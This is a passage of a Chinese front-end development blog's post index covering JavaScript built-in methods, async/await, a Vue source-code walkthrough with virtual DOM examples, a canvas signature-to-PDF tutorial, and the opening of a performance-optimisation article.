返回自然数的对数 Math.max(x, y) 返回最大值 Math.min(x, y) 返回最小值 Math.pow(x, y) 返回x的y次幂 Math.random() 返回0~1之间的随机数 Math.round() 把数四舍五入为最接近的整数 Math.sin() 返回数的正弦 Math.sqrt() 返回数的平方根 Math.tan() 返回角的正切 Math.toSource() 返回对象的源代码 Math.valueOf() 返回Math对象的原始值 字符串对象（String） charAt() 返回指定位置的字符 charCodeAt() 返回指定位置的字符的Unicode编码 concat() 连接两个或者更多字符串，并返回新的字符串 fromCharCode() 将Unicode编码转为字符 indexOf() 返回某个指定的字符串值在字符串首次出现的位置 includes() 查找字符串中是否包含指定的字符串 lastIndexOf() 从后向前搜索字符串，并从起始位置(0)开始返回字符串最后出现的位置 match() 查找找到一个或者多个正则表达式匹配 repeat() 复制字符串指定次数，并将它们连接在一起返回 replace() 在字符串中查找匹配的字符串，并替换与正则表达式匹配的字符串 search() 查找与正则表达式相匹配的值 slice() 提取字符串的片段，并在新的字符串中返回被提取的部分 split() 把字符串分割为字符串数组 startsWith() 查看字符串是否以指定的子字符串开头 substr(start, num) 从起始索引号提取字符串中指定数目的字符 substring(start,end) 提取两个字符串索引之间的字符 toLowerCase() 将字符串转化为小写 toUpperCase() 将字符串转化为大写 trim() 去除字符串两边的空白 toLocaleLowerCase() 根据本地主机的语言环境把字符串转化为小写 toLocaleUpperCase() 根据本地主机的语言环境把字符串转换为大写 toString() 返回一个字符串 valueOf() 返回某个字符串对象的原始值 anchor(text) 创建一个HTML锚 big() 用大号字体显示字符串 blink() 闪动文本 (不能用于IE,Chrome,或者Safari) bold() 使用粗体显示字符串 fixed() 用打字机文本显示字符串 fontcolor() 用指定的颜色来显示字符串 fontsize() 使用指定的尺寸来显示字符串 italics() 使用斜体显示字符串 link() 将字符串显示为连接 small() 使用小字号来显示字符串 strike() 用于显示加删除线的字符串 sub() 把字符串显示为下标 sup() 把字符串显示为上标 async await ​ async用于申明一个function是异步的，而await用于等待一个异步方法执行完成，await只能出现在async之后 async ​ async 定义的函数是一个promise对象，如果函数中return 一个直接良，async会把这个直接量通过peomise.resolve()封装成Promise对象 async函数返回的是一个Promise对象，所以最外层不能用await获取其返回值，可以用过原始的.then()链来处理这个Promise对象 ​ Promise 的特点——无等待，所以在没有 await 的情况下执行 async 函数，它会立即执行，返回一个 Promise 对象，并且，绝不会阻塞后面的语句。这和普通返回 Promise 对象的函数并无二致 await ​ await是个运算符，用于组成表达式，await表达式的运算结果取决于它等的东西 ​ 如果它等到的不是一个Promise对象，那await表达式的运算结果就是它等到的东西 ​ 如果他等到的是一个Promise对象，await会阻塞后面的代码，等着Promise对象resolve 然后得到resolve的值，作为await表达式的运算结果 ​ async函数调用不会造成阻塞，它内部所有的阻塞都被封装在一个Promise对象中异步执行 async/await 帮我们干了啥 ​ async会将气候的函数的返回值封装成一个Promise对象，而await会等待这个Promise完成，并将其resolve的结果返回出来 12345678function takeLongTime() &#123; return new Promise(resolve =&gt; &#123; setTimeout(() =&gt; resolve(&quot;long_time_value&quot;), 1000); &#125;);&#125;takeLongTime().then(v =&gt; &#123; console.log(&quot;got&quot;, v);&#125;); 12345678910function takeLongTime() &#123; return new Promise(resolve =&gt; &#123; setTimeout(() =&gt; resolve(&quot;long_time_value&quot;), 1000); &#125;);&#125;async function test() &#123; const v = await takeLongTime(); console.log(v);&#125;test(); async/await的优势在与处理then链 ​ 单一的Promise并不能发现async/await的优势，如果处理多个Promise组成的then链时，优势就能体现出来了 假设一个业务分多个步骤完成，每个步骤都是异步的，而且依赖于上一个步骤的结果，如果使用setTimeout来模拟异步操作 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/** * 传入参数 n，表示这个函数执行的时间（毫秒） * 执行的结果是 n + 200，这个值将用于下一步骤 */function takeLongTime(n) &#123; return new Promise(resolve =&gt; &#123; setTimeout(() =&gt; resolve(n + 200), n); &#125;);&#125;function step1(n) &#123; console.log(`step1 with $&#123;n&#125;`); return takeLongTime(n);&#125;function step2(n) &#123; console.log(`step2 with $&#123;n&#125;`); return takeLongTime(n);&#125;function step3(n) &#123; console.log(`step3 with $&#123;n&#125;`); return takeLongTime(n);&#125;// setTimeOutfunction doIt() &#123; console.time(&quot;doIt&quot;); const time1 = 300; step1(time1) .then(time2 =&gt; step2(time2)) .then(time3 =&gt; step3(time3)) .then(result =&gt; &#123; console.log(`result is $&#123;result&#125;`); console.timeEnd(&quot;doIt&quot;); &#125;);&#125;doIt();// async/awaitasync function doIt() &#123; console.time(&quot;doIt&quot;); const time1 = 300; const time2 = await step1(time1); const time3 = await step2(time2); const result = await step3(time3); console.log(`result is $&#123;result&#125;`); console.timeEnd(&quot;doIt&quot;);&#125;doIt(); ​ 现在把业务要求改一下，仍然是三个步骤，但每一个步骤都需要之前每个步骤的结果 12345678910111213141516171819202122232425262728async function doIt() &#123; console.time(&quot;doIt&quot;); const time1 = 300; const time2 = await step1(time1); const time3 = await step2(time1, time2); const result = await step3(time1, time2, time3); console.log(`result is $&#123;result&#125;`); console.timeEnd(&quot;doIt&quot;);&#125;// setTimeOutfunction doIt() &#123; console.time(&quot;doIt&quot;); const time1 = 300; step1(time1) .then(time2 =&gt; &#123; return step2(time1, time2) .then(time3 =&gt; [time1, time2, time3]); &#125;) .then(times =&gt; &#123; const [time1, time2, time3] = times; return step3(time1, time2, time3); &#125;) .then(result =&gt; &#123; console.log(`result is $&#123;result&#125;`); console.timeEnd(&quot;doIt&quot;); &#125;);&#125; 获取屏幕宽高获取屏幕高度方法- document.body.clientWidth ==&gt; BODY对象宽度 - document.body.clientHeight ==&gt; BODY对象高度 - document.documentElement.clientWidth ==&gt; 可见区域宽度 - document.documentElement.clientHeight ==&gt; 可见区域高度 - 网页可见区域宽： document.body.clientWidth - 网页可见区域高： document.body.clientHeight - 网页可见区域宽： document.body.offsetWidth (包括边线的宽) - 网页可见区域高： document.body.offsetHeight (包括边线的高) - 网页正文全文宽： document.body.scrollWidth - 网页正文全文高： document.body.scrollHeight - 网页被卷去的高： document.body.scrollTop - 网页被卷去的左： document.body.scrollLeft - 网页正文部分上： window.screenTop - 网页正文部分左： window.screenLeft - 屏幕分辨率的高： window.screen.height - 屏幕分辨率的宽： window.screen.width - 屏幕可用工作区高度： window.screen.availHeight - 屏幕可用工作区宽度： window.screen.availWidth 部分jQuery函数- $(window).height() //浏览器时下窗口可视区域高度 - $(document).height() //浏览器时下窗口文档的高度 - $(document.body).height() //浏览器时下窗口文档body的高度 - $(document.body).outerHeight(**true**) //浏览器时下窗口文档body的总高度 包括border padding margin - $(window).width() //浏览器时下窗口可视区域宽度 - $(document).width()//浏览器时下窗口文档对于象宽度 - $(document.body).width() //浏览器时下窗口文档body的高度 - $(document.body).outerWidth(**true**) //浏览器时下窗口文档body的总宽度 包括border padding HTML精确定位:scrollLeft,scrollWidth,clientWidth,offsetWidth- scrollHeight: 获取对象的滚动高度。 - scrollLeft:设置或获取位于对象左边界和窗口中目前可见内容的最左端之间的距离 - scrollTop:设置或获取位于对象最顶端和窗口中可见内容的最顶端之间的距离 - scrollWidth:获取对象的滚动宽度 - offsetHeight:获取对象相对于版面或由父坐标 offsetParent 属性指定的父坐标的高度 - offsetLeft:获取对象相对于版面或由 offsetParent 属性指定的父坐标的计算左侧位置 - offsetTop:获取对象相对于版面或由 offsetTop 属性指定的父坐标的计算顶端位置 - event.clientX 相对文档的水平座标 - event.clientY 相对文档的垂直座标 - event.offsetX 相对容器的水平坐标 - event.offsetY 相对容器的垂直坐标 - document.documentElement.scrollTop 垂直方向滚动的值 - event.clientX+document.documentElement.scrollTop 相对文档的水平座标+垂直方向滚动的量","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"array","slug":"array","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/array/"},{"name":"method","slug":"method","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/method/"}]},{"title":"01 - Vue源码解读-数据驱动-dom生成","date":"2020-12-16T02:54:22.000Z","path":"2020/12/16/vue-VirtualDOM-template/","text":"本片文章根据bilibili vue源码分析 视频练习及知识点记录 模仿vue原理 实现简单的DOM模板替换123456789&lt;div id=&quot;app&quot;&gt; &lt;div&gt; &lt;div&gt; &#123;&#123;name&#125;&#125; is &#123;&#123;behavior&#125;&#125; &lt;/div&gt; &lt;/div&gt; &lt;p&gt;人员：&#123;&#123;name&#125;&#125;&lt;/p&gt; &lt;p&gt;行为：&#123;&#123;behavior&#125;&#125;&lt;/p&gt;&lt;/div&gt; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950let data = &#123; name: &#x27;SoulReader&#x27;, behavior: &#x27;writing&#x27;&#125;/* * 惰性匹配 .+? 匹配所有包含在&#123;&#123;&#125;&#125;里面的元素分组 * 贪婪匹配 .+ 匹配包含在&#123;&#123;&#125;&#125;里面的元素 会忽略中间的&#123;&#123;&#125;&#125;部分*/const curlyRE = /\\&#123;\\&#123;(.+?)\\&#125;\\&#125;/gfunction compiler(template, data) &#123; const tempChilen = template.childNodes const length = tempChilen.length for(let i = 0; i &lt; length; i++) &#123; const nodeType = tempChilen[i].nodeType /* * nodeType * 1 代表元素节点 * 2 代表文本节点 */ if(nodeType === 3) &#123; // 代表是文本节点 /* * nodeValue 只有文本节点才有，nodeName只有元素节点才有 */ tempChilen[i].nodeValue = tempChilen[i].nodeValue.replace(curlyRE, (_, g) =&gt; &#123; /* * 第一个参数是正则表达式匹配到的东西 * 第二个参数及以后是第 n-1 个分组 */ return data[g.trim()] &#125;); &#125; else if(nodeType === 1) &#123; compiler(tempChilen[i], data) &#125; &#125;&#125;const node = document.getElementById(&#x27;app&#x27;)console.log(node)/* * 不能直接用获取到的 node 因为 DOM 是引用类型 * 需要利用 DOM 元素自带的 cloneNode 方法复制出一个新的node节点 * 参数传 true 表示复制当前节点的所有子孙节点，否则只复制当前节点 */const copyNode = node.cloneNode(true)compiler(copyNode, data)console.log(copyNode)/* * 调用 DOM 元素自带的 replaceChild( newNode, oldNode) 替换子节点方法*/app.parentNode.replaceChild(copyNode, node) 模板 要求一直在内存中 不会发生变化数据 数据发生变化后，会引起 DOM 的变化DOM 由模板和数据生成的页面 由 DOM 产生 对 DOM 渲染方法进行封装 123456789&lt;div id=&quot;app&quot;&gt; &lt;div&gt; &lt;div&gt; &#123;&#123;name&#125;&#125; &#123;&#123;behavior&#125;&#125; &lt;/div&gt; &lt;/div&gt; &lt;p&gt;人员：&#123;&#123;name&#125;&#125;&lt;/p&gt; &lt;p&gt;行为：&#123;&#123;behavior&#125;&#125;&lt;/p&gt;&lt;/div&gt; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556/* * Vue源码习惯 * 1 内部的数据使用 _ 开头 * 2 只读数据用 $ 开头*/function LikeVue(options) &#123; this._el = options.el this._data = options.data this.$el = this._templateDOM = document.querySelector(this._el) this.$parent = this._templateDOM.parentNode this.render()&#125;function compiler(template, data) &#123; const tempChilen = template.childNodes const length = tempChilen.length for(let i = 0; i &lt; length; i++) &#123; const nodeType = tempChilen[i].nodeType if(nodeType === 3) &#123; // 代表是文本节点 /* * nodeValue 只有文本节点才有，nodeName只有元素节点才有 */ tempChilen[i].nodeValue = tempChilen[i].nodeValue.replace(curlyRE, (_, g) =&gt; &#123; /* * 第一个参数是正则表达式匹配到的东西 * 第二个参数及以后是第 n-1 个分组 */ return data[g.trim()] &#125;); &#125; else if(nodeType === 1) &#123; compiler(tempChilen[i], data) &#125; &#125;&#125;// 渲染LikeVue.prototype.render = function() &#123; this.compiler()&#125;// 编译LikeVue.prototype.compiler = function() &#123; let template = document.querySelector(this._el) compiler(template, this._data) this.update(template)&#125;// 更新DOMLikeVue.prototype.update = function(template) &#123; this.$parent.replaceChild(template, document.querySelector(this._el))&#125;const options = &#123; el: &#x27;#app&#x27;, data: &#123; name: &#x27;优·库里伍德·海尔赛兹&#x27;, behavior: &#x27;吃橘子&#x27; &#125;&#125;const curlyRE = /\\&#123;\\&#123;(.+?)\\&#125;\\&#125;/glet Vue = new LikeVue(options) 对函数进行改造，使其能够转换DOM中多层嵌套的对象，例如other.behavior.name 12345678910111213141516171819202122232425262728293031323334// 修改data对象里面的属性为多层嵌套data: &#123; name: &#x27;优·库里伍德·海尔赛兹&#x27;, behavior: &#x27;吃橘子&#x27;, other: &#123; name: &#x27;相川步&#x27;, behavior: &#123; name: &#x27;魔装少女&#x27;, time: &#x27;12min&#x27; &#125; &#125;&#125;// 新增一个函数用来处理模板中多层嵌套的对象function splitAttribute(data, g) &#123; let res = data // 1. // g.split(&#x27;.&#x27;).map(item =&gt; &#123; // 当对一个变量赋值对象时，是对象的引用，变量中的某个值发生变化，对象中对应的值也会发生变化 // 但是给变量重新赋值对象，并不会造成原先对象的值发生变化，因为此时变量的引用已经发生变化，不在指向源对象 // res = res[item] // &#125;) //2. let paths = g.split(&#x27;.&#x27;) let prop while(prop = paths.shift()) &#123; res = res[prop] &#125; return res&#125;// 修改正则表达式替换函数的回调函数的返回值tempChilen[i].nodeValue = tempChilen[i].nodeValue.replace(curlyRE, (_, g) =&gt; &#123; return splitAttribute(data, g.trim())&#125;); 函数柯里化 目的是为了缓存一些内容，减少解析 柯里化: 一个函数原本有多个参数，传入一个参数，生成一个新函数，由新函数来接收剩余的参数，运行得到结果 偏函数: 一个函数原本有多个参数，传入一部分参数，生成一个新函数，由新函数来接收剩余的参数，运行得到结果 高阶函数: 一个函数，参数是一个函数，该函数对参数函数进行加工，得到加工后的函数123456789101112131415161718192021function createSplitAttribute(g) &#123; let paths = g.split(&#x27;.&#x27;) return function splitAttribute(data) &#123; let res = data // g.split(&#x27;.&#x27;).map(item =&gt; &#123; // res = res[item] // &#125;) //2. let prop while(prop = paths.shift()) &#123; // 当对一个变量赋值对象时，是对象的引用，变量中的某个值发生变化，对象中对应的值也会发生变化 // 但是给变量重新赋值对象，并不会造成原先对象的值发生变化，因为此时变量的引用已经发生变化，不在指向源对象 res = res[prop] &#125; return res &#125;&#125;// 调用const split = createSplitAttribute(g.trim())return split(data) 虚拟DOM 思路和深拷贝类似 将 真正的DOM 转化为 虚拟DOM 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// 虚拟DOM 减少了回流和重绘 提高了速度/* * &lt;div /&gt; =&gt; &#123;tag: &#x27;div&#x27;&#125; * &lt;div title=&quot;1&quot; class=&quot;c&quot; /&gt; =&gt; &#123;tag: &#x27;div&#x27;,data: &#123;title: &#x27;1&#x27;, class: &#x27;c&#x27;&#125;&#125; * &lt;div&gt;&lt;div /&gt;&lt;/div&gt; =&gt; &#123;tag: &#x27;div&#x27;, children: [&#123;tag: &#x27;div&#x27;&#125;]&#125;*/class VNode &#123; /* * tag: node.nodeValue * data: node.attributes =&gt; obj =&gt; &#123;node.attribute.nodeName: node.attribute.nodeValue&#125; */ constructor(tag, data, value, type) &#123; this.tag = tag &amp;&amp; tag.toLowerCase() this.data = data this.value = value this.type = type this.children = [] &#125; appendCild(vnode) &#123; this.children.push(vnode) &#125;&#125;// node 为页面中真实的 DOM 节点// 使用递归的方法提取出 DOM 节点中所有的子孙节点// Vue源码中使用 栈 的方式function getVnode(node) &#123; let nodeType = node.nodeType let _vnode = null // 判断nodeType类型 if(nodeType === 1) &#123; // 元素节点 let nodeName = node.nodeName // 获取 node 元素的 所有 attribute 属性， 是一个伪数组，需要转换成 对象 let attrs = node.attributes let _attrs = Object.create(null) for(let i = 0; i &lt; attrs.length; i++) &#123; _attrs[attrs[i].nodeName] = attrs[i].nodeValue &#125; _vnode = new VNode(nodeName, _attrs, undefined, nodeType) // 然后处理元素节点的所有自节点 let childNodes = node.childNodes for(let i = 0; i &lt; childNodes.length; i++) &#123; _vnode.appendCild(getVnode(childNodes[i])) &#125; &#125; else if(nodeType === 3) &#123; // 文本节点 // 文本节点没有 tag 属性 data属性 _vnode = new VNode(undefined, undefined, node.nodeValue, nodeType) &#125; return _vnode&#125;let app = document.querySelector(&#x27;#app&#x27;)let app1 = getVnode(app)console.log(app1) 将 虚拟DOM 转化为 真正的DOM 12345678910111213141516171819202122function parseVnode(vnode) &#123; const &#123;tag, data, type, value, children&#125; = vnode let dom = null if(type === 1) &#123; dom = document.createElement(tag) for(let key in data) &#123; dom.setAttribute(key, data[key]) &#125; dom.nodeType = type for(let i = 0; i &lt; children.length; i++) &#123; // dom.append(parseVnode(children[i])) dom.appendChild(parseVnode(children[i])) &#125; &#125; else if(type === 3) &#123; dom = document.createTextNode(tag) dom.nodeValue = value dom.nodeType = type &#125; return dom&#125;const dom = parseVnode(app1)console.log(dom, &#x27;dom&#x27;)","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"Vue","slug":"Vue","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Vue/"}]},{"title":"vue-源码","date":"2020-12-15T01:34:37.000Z","path":"2020/12/15/vue-源码常用方法/","text":"本片文章只用于引导自己如何对源码进行探索，因为看到源码的时候是一脸懵逼，完全不知道该从那个地方看起，所以用本篇文章记录一下自己的解读顺序，以免自己忘记 LIFECYCLE_HOOKS vue 钩子函数 beforeCreatecreatedbeforeMountemountedbeforeUpdateupdatedbeforeDestorydestoryedactivateddeactivatederrorCapturedserverPrefetch SOME USERFUL METHODS 判断浏览器类型1234567891011121314// packages/vue-template-compiler/browser.jsvar inBrowser = typeof window !== &#x27;undefined&#x27;;var inWeex = typeof WXEnvironment !== &#x27;undefined&#x27; &amp;&amp; !!WXEnvironment.platform;var weexPlatform = inWeex &amp;&amp; WXEnvironment.platform.toLowerCase();var UA = inBrowser &amp;&amp; window.navigator.userAgent.toLowerCase();var isIE = UA &amp;&amp; /msie|trident/.test(UA);var isIE9 = UA &amp;&amp; UA.indexOf(&#x27;msie 9.0&#x27;) &gt; 0;var isEdge = UA &amp;&amp; UA.indexOf(&#x27;edge/&#x27;) &gt; 0;var isAndroid = (UA &amp;&amp; UA.indexOf(&#x27;android&#x27;) &gt; 0) || (weexPlatform === &#x27;android&#x27;);// Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1var isIOS = (UA &amp;&amp; /iphone|ipad|ipod|ios/.test(UA)) || (weexPlatform === &#x27;ios&#x27;);var isChrome = UA &amp;&amp; /chrome\\/\\d+/.test(UA) &amp;&amp; !isEdge;var isPhantomJS = UA &amp;&amp; /phantomjs/.test(UA);var isFF = UA &amp;&amp; UA.match(/firefox\\/(\\d+)/); makeMap 创建一个闭包判断函数，判断元素是否存在 1234567891011121314// packages/vue-template-compiler/build.jsfunction makeMap (str, expectsLowerCase) &#123; var map = Object.create(null); var list = str.split(&#x27;,&#x27;); for (var i = 0; i &lt; list.length; i++) &#123; map[list[i]] = true; &#125; return expectsLowerCase ? function (val) &#123; return map[val.toLowerCase()]; &#125; : function (val) &#123; return map[val]; &#125;&#125;var isBuiltInTag = makeMap(&#x27;slot,component&#x27;, true)isBuiltInTag(&#x27;slot&#x27;) // true remove 123456789// packages/vue-template-compiler/build.jsfunction remove (arr, item) &#123; if (arr.length) &#123; var index = arr.indexOf(item); if (index &gt; -1) &#123; return arr.splice(index, 1) &#125; &#125;&#125; set 123456789101112131415161718192021222324252627282930313233343536373839function set (target, key, val) &#123; // 判断传入的 target 是否是 undefined 类型或者基础数据类型 if (isUndef(target) || isPrimitive(target) ) &#123; warn((&quot;Cannot set reactive property on undefined, null, or primitive value: &quot; + ((target)))); &#125; // 判断 target 是否是数组，以及 key 是否一个正常的数组序号 if (Array.isArray(target) &amp;&amp; isValidArrayIndex(key)) &#123; target.length = Math.max(target.length, key); // 在数组的 key 位替换成 val target.splice(key, 1, val); return val &#125; // target 为对象的话且 key 不是 Object 的属性，避免修改 Object 的属性，造成对象污染 if (key in target &amp;&amp; !(key in Object.prototype)) &#123; target[key] = val; return val &#125; // 每个被双向绑定的 数据 都有一个 __ob__ 对象 var ob = (target).__ob__; // 如果 target 对象是 Vue 实例 或者 ob有值，则禁止向 Vue 实例上添加动态响应式属性 if (target._isVue || (ob &amp;&amp; ob.vmCount)) &#123; warn( &#x27;Avoid adding reactive properties to a Vue instance or its root $data &#x27; + &#x27;at runtime - declare it upfront in the data option.&#x27; ); return val &#125; // 如果不是 Vue 实例 直接添加属性 if (!ob) &#123; target[key] = val; return val &#125; // 在对象上定义被动特性 defineReactive$$1(ob.value, key, val); // 触发 通知事件 ob.dep.notify(); return val&#125;","tags":[{"name":"Vue","slug":"Vue","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/Vue/"},{"name":"源码","slug":"源码","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/%E6%BA%90%E7%A0%81/"}]},{"title":"H5基于canvas实现电子签名并生成PDF文档","date":"2020-12-14T09:15:09.000Z","path":"2020/12/14/H5基于canvas实现电子签名并生成PDF文档/","text":"转载前端大全 前言电子签名通俗来说就是通过技术手段实现在电子文档上加载电子形式的签名，其作用类似于纸质合同上的手写签名或加盖的公章。虽然电子签名多年来合法性一直遭到质疑，但其在企业工作流审批、请柬、单据保全等场景应用广泛，最近的项目中就有这样一个手写签名并生成PDF文件的需求。 实现思路使用canvas来实现手写签名的功能，然后将canvas转化为图片，贴在签名的位置；将整个需要生成文档的dom区域使用html2canvas插件转成一张大图；使用JsPDF插件将上述图片生成PDF文档；对于文件内容较多的情况，需要合理选择分页位置；生成签名 在tsx中定义canvas画布 1&lt;canvas className=&#123;styles.canvas&#125; ref=&#123;canvasDom&#125; width=&quot;350&quot; height=&quot;150&quot; /&gt; 注意：Canvas的宽高必须要使用内联样式定义，这是因为Canvas标签有自己的默认宽高300px×150px。它内联样式定义的width和height是绘画区域（画布）实际宽度和高度，绘制的图形都是在这个上面。如果在style外链文件中定义其width和height，那么这个width和height是Canvas在浏览器中被渲染的高度和宽度。如果Canvas中没有直接定义width和height没或值不正确，就会被设置成默认值{width:300px，height:150px}。所以，如果你在style中外链文件中设置了canvas {width: 200px; height: 200px;}，却没有直接在canvas上定义画布宽高，那么此时你输出canvas.height 值依旧为150，canvas.width值依旧为300。也就是一块150×300的画布在200×200的区域渲染，因而图片会出现拉伸、变形等现象。 定义签名函数 12345678910111213141516const writing = ( beginX: number, beginY: number, stopX: number, stopY: number, ctx: any, ) =&gt; &#123; ctx.beginPath(); // 开启一条新路径 ctx.globalAlpha = 1; // 设置图片的透明度 ctx.lineWidth = 3; // 设置线宽 ctx.strokeStyle = &#x27;red&#x27;; // 设置路径颜色 ctx.moveTo(beginX, beginY); // 从(beginX, beginY)这个坐标点开始画图 ctx.lineTo(stopX, stopY); // 定义从(beginX, beginY)到(stopX, stopY)的线条（该方法不会创建线条） ctx.closePath(); // 创建该条路径 ctx.stroke(); // 实际地绘制出通过 moveTo() 和 lineTo() 方法定义的路径。默认颜色是黑色。 &#125;; 注册监听事件12345678910111213141516171819let beginX: number, beginY: number;const canvas: HTMLCanvasElement = canvasDom.current;const ctx = canvas.getContext(&#x27;2d&#x27;);ctx.fillStyle = &#x27;#fff&#x27;;ctx.fillRect(0, 0, canvas.width, canvas.height);canvas.addEventListener(&#x27;touchstart&#x27;, function(event: any) &#123; event.preventDefault(); // 阻止在canvas画布上签名的时候页面跟着滚动 beginX = event.touches[0].clientX - this.offsetLeft; beginY = event.touches[0].pageY - this.offsetTop;&#125;);canvas.addEventListener(&#x27;touchmove&#x27;, (event: any) =&gt; &#123; event.preventDefault(); // 阻止在canvas画布上签名的时候页面跟着滚动 event = event.touches[0]; let stopX = event.clientX - canvas.offsetLeft; let stopY = event.pageY - canvas.offsetTop; writing(beginX, beginY, stopX, stopY, ctx); beginX = stopX; // 这一步很关键，需要不断更新起点，否则画出来的是射线簇 beginY = stopY;&#125;); 注意： 在注册“touchstart”和“touchmove”事件时，需要阻止默认事件，否则页面会跟着手势上下滑动。移动端的每个触摸事件对象中都包括了touches这个属性，它用于描述位于屏幕上的所有手指的一个列表，获取当前事件对象我们习惯性的使用event = event.touches[0],而在PC端则不需要这么操作。offsetLeft值跟offsetTop值跟父级元素没关系，而是跟其上一级的定位元素(除position:static外的所有定位如fixed,relative,absolute元素)有关系。若上一级定位元素都没有除position:staice外的定位，则这个偏移量是相对于body而言的。需要理清移动端事件对象的几个属性，⏬clientX/clientY: 触摸位置距离当前body可视区域的x,y坐标;pageX/pageY: 对于整个页面来说，触摸位置距离body左上角的x,y坐标，包括被scrollTop和scrollLeft的值；screenX/screenY: 触摸位置距离显示器左边和顶部的x,y距离。所以，在获取结束点坐标的时候，如果当前页面没有出现滚动条，使用clientY和pageY计算差别不大，如果页面比较长，出现了滚动条，那么就必须要使用pageY来计算。clientX同理，但是移动端通常横向滚动的场景不多，所以用clientX来计算即可。 在签名（touchmove）这个动作过程中，我们需要不断的更新起点位置，否则画出来是这样🔽图片其实这个原理和微积分很相似，线段本质上就是由无穷多个小线段组成，宏观一点来看可以把线段当成一个个长度很小的小线段首尾相连构成。所以我一直觉得编程编到最后就是考验一个人的数学能力，交并集、逻辑思维、算法等都能看到数学的身影。最后生成签名如下：图片 生成PDF文档html2canvas是一款将HTML代码转换成Canvas的插件，因此需要用一个div包裹住需要打印的内容区域，获得这个dom节点。1234567html2Canvas(dom, &#123; allowTaint: true, width: dom.offsetWidth, //设置获取到的canvas宽度 height: dom.offsetHeight, //设置获取到的canvas高度 x: 0, //页面在水平方向滚动的距离 y: 0, //页面在垂直方向滚动的距离&#125;)注意：此处需要设置width和height及x,y，否则当页面内容只有一页的时候没有问题，但是若页面内容有很多页的时候，就会出现生成的图片只有一小部分有内容的现象。问题就出现在这个配置参数上，若没有设置宽高，则默认只取当前视口的内容，丢弃掉其他超出当前视口的内容。设置打印参数：123456789101112131415161718192021222324252627282930313233const print = () =&gt; &#123; let dom: HTMLElement = pdfDom.current; html2Canvas(dom, &#123; allowTaint: true, width: dom.offsetWidth, //设置获取到的canvas宽度 height: dom.offsetHeight, //设置获取到的canvas高度 x: 0, //页面在水平方向滚动的距离 y: 0, //页面在垂直方向滚动的距离 &#125;).then((canvas: HTMLCanvasElement) =&gt; &#123; let canvasWidth = canvas.width; let canvasHeight = canvas.height; let pageHeight = (canvasWidth / 592.28) * 841.89; // 一页A4 pdf能显示的canvas高度 let imgWidth = 595.28; // 设置图片宽度和A4纸宽度相等 let imgHeight = (592.28 / canvasWidth) * canvasHeight;//等比例换算成A4纸的高度 let totalHeight = imgHeight; // 需要打印的图片总高度，初始状态和图片高度相等 let pageData = canvas.toDataURL(&#x27;image/png&#x27;, 1.0); let PDF = new JsPDF(&#x27;p&#x27;, &#x27;pt&#x27;, &#x27;a4&#x27;, true); if (totalHeight &lt; pageHeight) &#123; // PDF.addImage(pageData, &#x27;JPEG&#x27;, 0, 0, imgWidth, imgHeight); // 从顶部开始打印 &#125; else &#123; let top = 0; // 打印初始区域 while (totalHeight &gt; 0) &#123; PDF.addImage(pageData, &#x27;JPEG&#x27;, 0, top, imgWidth, imgHeight); // 从图片顶部往下top位置开始打印 totalHeight -= pageHeight; top -= 841.89; if (totalHeight &gt; 0) &#123; PDF.addPage(); &#125; &#125; &#125; PDF.save(&#x27;test.pdf&#x27;); &#125;); &#125;;选择分页位置 按照上述步骤生成了一份PDF文档，但是当PDF页数有很多的时候，会有这样的问题可以看到，分页的时候从这段文字这里懒腰截断了。这显然不是我们想要看到的效果，如何解决这个问题呢？🤔 PDF文档页数较少的情况可以在开发测试的时候预先在将要分页的地方插入一个padding，就是提前预留分页位置 PDF文档页数较多对于这种情况，笔者尝试遍历要打印的dom节点的子节点，将每一页所能打印的dom节点高度累加，若超过了页面所能承载的最大高度，则将最后一个节点增加padding，打印完毕将样式还原。这种方法因为要计算每个dom节点的高度，非常耗性能，也要求页面dom元素的颗粒度较细，否则会出现一个页面有大块空白，完全无法模拟出word生成pdf的那种效果，所以就不展开讨论了。如若有读者有比较好的解放方案，欢迎不吝赐教，感谢~❤️","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"canvas","slug":"canvas","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/canvas/"}]},{"title":"前端性能优化 - 转载","date":"2020-12-11T03:05:09.000Z","path":"2020/12/11/前端性能优化/","text":"前言当我们去面试的时候，很大概率会被面试官问这么一个问题：你有尝试过对项目做性能优化吗？或者你了解哪些性能优化的方法？听到这个问题的你可能是这样的： 似曾相识但又说不清楚，往往只能零散地说出那么几点，难以做到有条理的回答。那么，本文就带你简单了解前端性能优化的几个主要方面，旨在抛砖引玉。 一、资源的合并和压缩web前端应用的开发与部署过程： 输入url到页面显示出来的过程： 请求过程中一些潜在的性能优化点： dns是否可以通过缓存减少dns查询时间？ 网络请求的过程如何走最近的网络环境？ 相同的静态资源是否可以缓存？ 能否减少http请求的大小和次数？ 能否进行服务端渲染？ 总结：深入理解http请求的过程是前端性能优化的核心。 优化核心 减少http请求数量； 减少请求资源的大小； google首页案例学习 html压缩； css压缩； js的压缩和混乱； 文件合并； 开启gzip； 1.html压缩HTML代码压缩就是压缩一些在文本文件中有意义，但是在HTML中不显示的字符，包括空格，制表符，换行符等，还有一些其他意义的字符，如HTML注释也可以被压缩； 一个简单的计算： google的流量，占到整个互联网的40%，预计2016年全球网络流量将达到1.3ZB(1ZB = 10^9TB)，那么google在2016年的流量就是1.3ZB * 40%，如果google每1MB请求减少一个字节，每年可以节省流量近500TB流量。 如何进行html压缩 使用在线网站进行压缩； nodejs提供的html-minifier工具； 后端模板引擎渲染压缩； 2.css代码压缩分为两部分： 